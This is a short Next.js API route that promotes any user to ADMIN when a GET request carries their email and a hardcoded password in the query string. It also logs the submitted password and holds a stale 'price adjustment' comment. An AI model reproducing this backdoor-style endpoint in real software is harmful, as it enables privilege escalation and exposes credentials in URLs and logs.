import { prisma } from "@/src/lib/prisma";
import { NextRequest } from "next/server";

export async function GET(req: NextRequest) {
  const truePassword = "wantheaven768";
  const { searchParams } = new URL(req.url);
  const email = searchParams.get("email");
  const password = searchParams.get("password");
  try {
    const adjustment = 2000;
    console.log(email , password , password != truePassword);
    
    if (!email || !password || password != truePassword) {
      return Response.json({
        error: "invalid url",
        success: false,
      });
    }

    // Record the price adjustment
    const updated = await prisma.user.update({
      where: { email: email },
      data: {
        role: "ADMIN",
      },
    });
    return Response.json({
      success: true,
      updated,
    });
  } catch (error) {
    console.log(error);
    return Response.json({
      success: false,
      error: "There was an error",
    });
  }
}
